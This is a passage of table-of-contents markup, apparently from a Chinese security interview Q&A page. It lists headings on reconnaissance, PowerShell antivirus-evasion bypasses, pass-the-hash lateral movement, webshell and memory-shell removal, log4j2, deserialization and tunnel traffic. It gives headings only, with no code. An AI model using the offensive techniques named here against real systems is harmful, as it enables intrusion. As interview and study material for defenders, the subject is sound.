href="#%E7%BB%BC%E5%90%88%E6%90%9C%E7%B4%A2"><span class="toc-number">26.1.2.6.</span> <span class="toc-text">综合搜索</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E7%AD%9B%E9%80%89"><span class="toc-number">26.1.2.7.</span> <span class="toc-text">子域名筛选</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86"><span class="toc-number">26.1.2.8.</span> <span class="toc-text">相关域名收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%81%E7%AB%99%E5%8F%8Ac%E6%AE%B5%E6%94%B6%E9%9B%86"><span class="toc-number">26.1.2.8.1.</span> <span class="toc-text">旁站及c段收集</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">26.1.2.8.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BB%E7%AB%99%E6%8F%90%E5%8F%96"><span class="toc-number">26.1.2.8.3.</span> <span class="toc-text">主站提取</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A7%BB%E5%8A%A8%E7%AB%AF"><span class="toc-number">26.1.2.8.4.</span> <span class="toc-text">移动端</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A1%8C%E4%B8%9A%E7%B3%BB%E7%BB%9F"><span class="toc-number">26.1.2.8.5.</span> <span class="toc-text">行业系统</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#73-%E5%85%8D%E6%9D%80%E4%BA%86%E8%A7%A3%E8%BF%87%E5%A4%9A%E5%B0%91"><span class="toc-number">26.2.</span> <span class="toc-text">73.免杀了解过多少</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell%E5%85%8D%E6%9D%80"><span class="toc-number">26.2.1.</span> <span class="toc-text">powershell免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95"><span class="toc-number">26.2.1.1.</span> <span class="toc-text">免杀方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97%E6%8B%86%E5%88%86%E8%BF%9B%E8%A1%8Cbypass"><span class="toc-number">26.2.1.1.1.</span> <span class="toc-text">使用关键字拆分进行bypass</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Fuzz%E6%80%9D%E6%83%B3%E8%BF%9B%E8%A1%8Cbypass"><span class="toc-number">26.2.1.1.2.</span> <span class="toc-text">Fuzz思想进行bypass</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B6%85%E9%95%BF%E5%91%BD%E4%BB%A4bypass"><span class="toc-number">26.2.1.1.3.</span> <span class="toc-text">超长命令bypass</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8copy%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8Cbypass"><span class="toc-number">26.2.1.1.4.</span> <span class="toc-text">使用copy命令进行bypass</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B7%B7%E5%90%88bypass"><span class="toc-number">26.2.1.1.5.</span> <span class="toc-text">混合bypass</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#74-%E4%B8%8D%E6%AD%BB%E9%A9%AC%E6%9F%A5%E6%9D%80"><span class="toc-number">26.3.</span> <span class="toc-text">74.不死马查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#root%E7%94%A8%E6%88%B7%E8%A7%92%E5%BA%A6%E7%9A%84%E6%9F%A5%E6%9D%80"><span class="toc-number">26.3.1.</span> <span class="toc-text">root用户角度的查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%80%E6%8E%89%E8%BF%9B%E7%A8%8B"><span class="toc-number">26.3.1.1.</span> <span class="toc-text">杀掉进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E7%9A%84%E6%9F%A5%E6%9D%80"><span class="toc-number">26.3.1.2.</span> <span class="toc-text">其他用户的查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%80%E6%8E%89%E8%BF%9B%E7%A8%8B%EF%BC%9A"><span class="toc-number">26.3.1.2.1.</span> <span class="toc-text">杀掉进程：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">26.3.1.2.2.</span> <span class="toc-text">条件竞争:</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#75-%E6%8E%92%E6%9F%A5%E5%87%BA%E6%9D%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-%E6%B2%A1%E6%9C%89%E6%97%A5%E5%BF%97%E6%80%8E%E4%B9%88%E6%89%BE"><span class="toc-number">26.4.</span> <span class="toc-text">75.排查出来一句话木马,没有日志怎么找</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95"><span class="toc-number">26.4.1.</span> <span class="toc-text">检查网站目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F"><span class="toc-number">26.4.2.</span> <span class="toc-text">检查网络流量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%AB%E4%BA%BA%E5%B7%B2%E7%BB%8F%E5%B0%86%E6%9C%A8%E9%A9%AC%E4%BC%A0%E5%88%B0%E4%B8%BB%E6%9C%BA%E6%97%B6-%E6%80%8E%E4%B9%88%E6%8E%92%E6%9F%A5"><span class="toc-number">26.5.</span> <span class="toc-text">别人已经将木马传到主机时,怎么排查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8PHP%E7%9A%84-%E5%8A%9F%E8%83%BD"><span class="toc-number">26.5.1.</span> <span class="toc-text">利用PHP的 功能</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#76%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">26.6.</span> <span class="toc-text">76域内横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E5%B8%B8%E7%94%A8%E7%9A%84windows%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E5%92%8C%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="toc-number">26.6.1.</span> <span class="toc-text">0x01 常用的windows远程连接和相关命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-Windoors%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96"><span class="toc-number">26.6.1.1.</span> <span class="toc-text">0x02 Windoors系统散列值获取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">26.6.1.2.</span> <span class="toc-text">0x03 哈希传递攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92"><span class="toc-number">26.6.1.3.</span> <span class="toc-text">0x04票据传递</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#77-%E5%A6%82%E4%BD%95%E6%BA%AF%E6%BA%90"><span class="toc-number">26.7.</span> <span class="toc-text">77.如何溯源</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%E4%B8%80"><span class="toc-number">26.7.1.</span> <span class="toc-text">答案一:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%E4%BA%8C"><span class="toc-number">26.7.2.</span> <span class="toc-text">答案二</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-ip-%E6%BA%AF%E6%BA%90%E4%B8%80%E4%BA%8C"><span class="toc-number">26.7.2.1.</span> <span class="toc-text">针对 ip 溯源一二</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A5%E8%87%AA%E5%88%9B%E5%AE%87%E7%9B%BE%E7%AD%89%E8%8A%82%E7%82%B9%E7%9A%84%E6%B5%81%E9%87%8F-ip"><span class="toc-number">26.7.2.2.</span> <span class="toc-text">来自创宇盾等节点的流量 ip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#whois-%E5%9F%9F%E5%90%8D%E5%8F%8D%E6%9F%A5"><span class="toc-number">26.7.2.3.</span> <span class="toc-text">whois 域名反查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3-%E6%9C%8D%E5%8A%A1-%E8%BF%9B%E8%A1%8C%E5%8F%8D%E6%B8%97%E9%80%8F"><span class="toc-number">26.7.2.4.</span> <span class="toc-text">探测端口 服务 进行反渗透</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5"><span class="toc-number">26.7.2.5.</span> <span class="toc-text">威胁情报</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%82%AE%E7%AE%B1-qq-%E6%89%8B%E6%9C%BA%E5%8F%B7-%E7%A4%BE%E5%B7%A5%E5%BA%93"><span class="toc-number">26.7.2.6.</span> <span class="toc-text">邮箱 qq 手机号 社工库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#qq-%E5%BE%AE%E4%BF%A1-%E6%8A%96%E9%9F%B3-%E9%99%8C%E9%99%8C-%E7%AD%89%E6%8E%A5%E5%8F%A3"><span class="toc-number">26.7.2.7.</span> <span class="toc-text">qq 微信 抖音 陌陌 等接口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ga-%E6%95%B0%E6%8D%AE-%E8%BF%90%E8%90%A5%E5%95%86%E6%95%B0%E6%8D%AE"><span class="toc-number">26.7.2.8.</span> <span class="toc-text">ga 数据 运营商数据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%AF%E6%BA%90%E5%A6%82%E6%9E%9C%E6%8C%82%E4%BA%86%E4%BB%A3%E7%90%86%E6%80%8E%E4%B9%88%E5%81%9A%EF%BC%9F"><span class="toc-number">26.7.3.</span> <span class="toc-text">溯源如果挂了代理怎么做？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#78-%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%94%A8%E8%BF%87%E5%90%97"><span class="toc-number">26.8.</span> <span class="toc-text">78.网络空间搜索引擎用过吗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FOFA"><span class="toc-number">26.8.1.</span> <span class="toc-text">FOFA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#79-%E6%80%8E%E4%B9%88%E7%94%A8%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E9%85%8D%E5%90%88xss%E6%94%BB%E5%87%BB%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90"><span class="toc-number">26.9.</span> <span class="toc-text">79.怎么用渗透工具配合xss攻击获取服务器权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E7%9F%BF"><span class="toc-number">26.9.1.</span> <span class="toc-text">挖矿</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91"><span class="toc-number">26.9.2.</span> <span class="toc-text">内网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5"><span class="toc-number">26.9.3.</span> <span class="toc-text">JNDI注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNI%E6%B3%A8%E5%85%A5"><span class="toc-number">26.9.4.</span> <span class="toc-text">JNI注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSTL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">26.9.5.</span> <span class="toc-text">JSTL任意文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#80-%E8%8E%B7%E5%BE%97%E4%BA%86etc-passwd%E6%96%87%E4%BB%B6%E4%B9%8B%E5%90%8E%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8"><span class="toc-number">26.10.</span> <span class="toc-text">80.获得了etc&#x2F;passwd文件之后如何利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#-3"><span class="toc-number">26.11.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#81-java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80"><span class="toc-number">26.12.</span> <span class="toc-text">81.java内存马查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%89%B9%E5%BE%81%E7%9A%84%E8%AF%86%E5%88%AB"><span class="toc-number">26.12.1.</span> <span class="toc-text">内存马特征的识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E5%A4%A7%E7%B1%BB"><span class="toc-number">26.12.2.</span> <span class="toc-text">三大类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8java-agent%E6%8A%80%E6%9C%AF%E9%81%8D%E5%8E%86%E6%89%80%E6%9C%89%E5%B7%B2%E7%BB%8F%E5%8A%A0%E8%BD%BD%E5%88%B0%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84class-%E5%85%88%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%98%AF%E5%86%85%E5%AD%98%E9%A9%AC-%E6%98%AF%E5%88%99%E8%BF%9B%E5%85%A5%E5%86%85%E5%AD%98%E6%9F%A5%E6%9D%80"><span class="toc-number">26.12.2.1.</span> <span class="toc-text">利用java agent技术遍历所有已经加载到内存中的class,先判断是否是内存马,是则进入内存查杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#filter%E7%89%B9%E6%AE%8A%E5%90%8D%E7%A7%B0"><span class="toc-number">26.12.2.2.</span> <span class="toc-text">filter特殊名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#filter%E4%BC%98%E5%85%88%E7%BA%A7%E6%98%AF%E7%AC%AC%E4%B8%80%E4%BD%8D"><span class="toc-number">26.12.2.3.</span> <span class="toc-text">filter优先级是第一位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-xml%E4%B8%AD%E6%B2%A1%E6%9C%89filter%E9%85%8D%E7%BD%AE"><span class="toc-number">26.12.2.4.</span> <span class="toc-text">web.xml中没有filter配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8Aclassloader%E5%8A%A0%E8%BD%BD"><span class="toc-number">26.12.2.5.</span> <span class="toc-text">特殊classloader加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Filter%E7%9A%84doFilter%E6%96%B9%E6%B3%95%E4%B8%AD%E6%9C%89%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-number">26.12.2.6.</span> <span class="toc-text">Filter的doFilter方法中有恶意代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E7%AE%80%E8%BF%B0"><span class="toc-number">26.12.3.</span> <span class="toc-text">原理简述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#servlet-api%E7%B1%BB"><span class="toc-number">26.12.3.1.</span> <span class="toc-text">servlet-api类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#82-%E5%AF%B9%E8%BE%B9%E7%BC%98%E4%B8%9A%E5%8A%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F%E8%BF%87%E5%90%97"><span class="toc-number">26.13.</span> <span class="toc-text">82.对边缘业务小程序渗透过吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#83-%E5%AF%B9%E9%95%9C%E5%83%8F%E5%8A%AB%E6%8C%81%E7%9A%84%E4%BA%86%E8%A7%A3"><span class="toc-number">26.14.</span> <span class="toc-text">83.对镜像劫持的了解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#84-mysql-%E7%9A%84udf%E6%8F%90%E6%9D%83%EF%BC%9A%E5%8E%9F%E7%90%86"><span class="toc-number">26.15.</span> <span class="toc-text">84.mysql 的udf提权：原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#85-JAVA-%E5%AE%9E%E7%8E%B0RCE%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">26.16.</span> <span class="toc-text">85.JAVA 实现RCE漏洞的函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#86-%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%9C%89%E4%BD%BF%E7%94%A8%E8%BF%87%E5%90%97-%E9%98%B2%E7%81%AB%E5%A2%99-%E8%B7%AF%E7%94%B1%E5%99%A8-%E4%BA%A4%E6%8D%A2%E6%9C%BA"><span class="toc-number">26.17.</span> <span class="toc-text">86.网络设备有使用过吗,防火墙,路由器,交换机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#87-%E6%9C%80%E6%96%B0%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%9C%89%E4%BA%86%E8%A7%A3%E8%BF%87%E5%90%97"><span class="toc-number">26.18.</span> <span class="toc-text">87.最新的漏洞有了解过吗?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#88-%E7%9C%8B%E4%BD%A0%E6%9C%89%E8%BF%87%E5%BC%80%E5%8F%91%E7%9A%84%E7%BB%8F%E9%AA%8C-%E6%9C%89%E5%86%99%E8%BF%87sql%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC-%E8%AF%B4%E4%B8%80%E4%B8%8B%E8%BF%99%E4%B8%AA%E8%84%9A%E6%9C%AC%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">26.19.</span> <span class="toc-text">88.看你有过开发的经验,有写过sql注入脚本,说一下这个脚本的情况?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#89-mysql%E5%9C%A8linux%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%98%AF%E5%93%AA%E4%B8%AA%EF%BC%9F"><span class="toc-number">26.20.</span> <span class="toc-text">89.mysql在linux的配置文件是哪个？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#90-%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E4%BD%BF%E7%94%A8%E7%9A%84%E4%BB%80%E4%B9%88%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9F-%E5%88%A4%E6%96%ADweb%E5%90%8E%E5%8F%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">26.21.</span> <span class="toc-text">90.**如何判断使用的什么数据库？**判断web后台数据库类型的方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#91-Nginx%E7%9A%84%E6%97%A5%E5%BF%97%E6%94%BE%E5%9C%A8%E9%82%A3%E9%87%8C%EF%BC%8C%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90-%E4%B8%BB%E8%A6%81%E7%9C%8B%E5%93%AA%E4%BA%9B%E4%BD%A0%E8%AE%A4%E4%B8%BA%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9%EF%BC%9F"><span class="toc-number">26.22.</span> <span class="toc-text">91.Nginx的日志放在那里，如何进行分析?主要看哪些你认为重要的地方？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#92-%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E6%94%BE%E5%9C%A8%E9%82%A3%E9%87%8C%EF%BC%9F"><span class="toc-number">26.23.</span> <span class="toc-text">92.系统日志放在那里？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#93-%E9%81%87%E5%88%B0%E4%BA%86IDS-IPS%E4%BD%A0%E5%A6%82%E4%BD%95%E5%AF%B9%E6%8A%97%EF%BC%9F"><span class="toc-number">26.24.</span> <span class="toc-text">93.遇到了IDS&#x2F;IPS你如何对抗？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#94-DNS%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">26.25.</span> <span class="toc-text">94.DNS的工作原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#95-%E4%B8%8D%E5%9B%9E%E6%98%BE%E5%8F%AF%E4%BB%A5%E5%A4%96%E5%B8%A6"><span class="toc-number">26.26.</span> <span class="toc-text">95.不回显可以外带</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#96-log4j2"><span class="toc-number">26.27.</span> <span class="toc-text">96.log4j2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#96-java%E4%B8%AD%E9%97%B4%E4%BB%B6"><span class="toc-number">26.28.</span> <span class="toc-text">96.java中间件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#97-IDS%E5%92%8CWAF%E7%9A%84%E5%8C%BA%E5%88%AB-IPS"><span class="toc-number">26.29.</span> <span class="toc-text">97.**IDS和WAF的区别 **IPS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#98-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="toc-number">26.30.</span> <span class="toc-text">98.反序列化的概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BA%A7%E7%94%9F"><span class="toc-number">26.30.1.</span> <span class="toc-text">反序列化漏洞的产生</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">26.30.2.</span> <span class="toc-text">反序列化中常见的魔术方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#99-%E6%97%A5%E5%BF%97%E8%A2%AB%E5%88%A0%E9%99%A4"><span class="toc-number">26.31.</span> <span class="toc-text">99.日志被删除</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#100-%E5%A6%82%E6%9E%9C%E4%B8%80%E4%B8%AA%E6%9C%A8%E9%A9%AC%E5%90%AF%E5%8A%A8%E4%BA%86%EF%BC%8C%E5%B9%B6%E8%87%AA%E5%88%A0%E9%99%A4%EF%BC%8C%E6%B3%A8%E5%85%A5%E5%85%B6%E5%AE%83%E8%BF%9B%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E6%A0%B7%E6%9C%AC%EF%BC%8C%E5%B9%B6%E6%8F%90%E4%BA%A4%E7%BB%99WEB%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%88%86%E6%9E%90"><span class="toc-number">26.32.</span> <span class="toc-text">100.如果一个木马启动了，并自删除，注入其它进程中，如何获取样本，并提交给WEB工程师分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#101-%E5%A4%A7%E9%87%8F%E6%B5%81%E9%87%8F%E5%91%8A%E8%AD%A6%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E6%8E%92%E6%9F%A5%E6%8A%80%E5%B7%A7"><span class="toc-number">26.33.</span> <span class="toc-text">101.大量流量告警如何快速排查技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#102-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">26.34.</span> <span class="toc-text">102.中间件漏洞流量特征</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#103-%E8%AE%BE%E5%A4%87%E5%85%A8%E5%85%B3%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E5%A6%82%E4%BD%95%E6%8E%92%E6%9F%A5webshell"><span class="toc-number">26.35.</span> <span class="toc-text">103.设备全关的情况下如何排查webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#104-%E5%A6%82%E4%BD%95%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%97%A0%E8%AE%BE%E5%A4%87%E6%8E%92%E6%9F%A5%E6%BC%8F%E6%B4%9E-web%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">26.36.</span> <span class="toc-text">104.如何在服务器上无设备排查漏洞(web服务器)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#105-CORS%E6%BC%8F%E6%B4%9E"><span class="toc-number">26.37.</span> <span class="toc-text">105.CORS漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">26.38.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="toc-number">26.39.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95"><span class="toc-number">26.40.</span> <span class="toc-text">测试方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#106-%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E5%A4%84%E7%90%86-%E5%A6%82%E4%BD%95%E6%8E%92%E6%9F%A5%E6%81%B6%E6%84%8F%E5%A4%96%E9%93%BE%E7%B1%BB%E5%9E%8B"><span class="toc-number">26.41.</span> <span class="toc-text">106.钓鱼邮件处理,如何排查恶意外链类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#107-%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B"><span class="toc-number">26.42.</span> <span class="toc-text">107.攻击事件复现流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#108-%E8%83%BDgetshell%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">26.43.</span> <span class="toc-text">108.能getshell的漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#109-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6"><span class="toc-number">26.44.</span> <span class="toc-text">109.反序列化的中间件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#110-sql%E6%B3%A8%E5%85%A5%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90"><span class="toc-number">26.45.</span> <span class="toc-text">110.sql注入告警分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#111-%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%EF%BC%8C%E5%AF%B9%E5%BA%94%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81-dns%EF%BC%8Cicmp%E7%AD%89"><span class="toc-number">26.46.</span> <span class="toc-text">111.隧道通信，对应的流量特征 dns，icmp等</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dns"><span class="toc-number">26.46.1.</span> <span class="toc-text">dns</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ICMP"><span class="toc-number">26.46.2.</span> <span class="toc-text">ICMP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E7%8E%AF%E5%A2%83"><span class="toc-number">26.47.</span> <span class="toc-text">0x01 环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%88%86%E6%9E%90"><span class="toc-number">26.48.</span> <span class="toc-text">0x02 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81ICMP%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">26.48.1.</span> <span class="toc-text">1、ICMP隧道技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 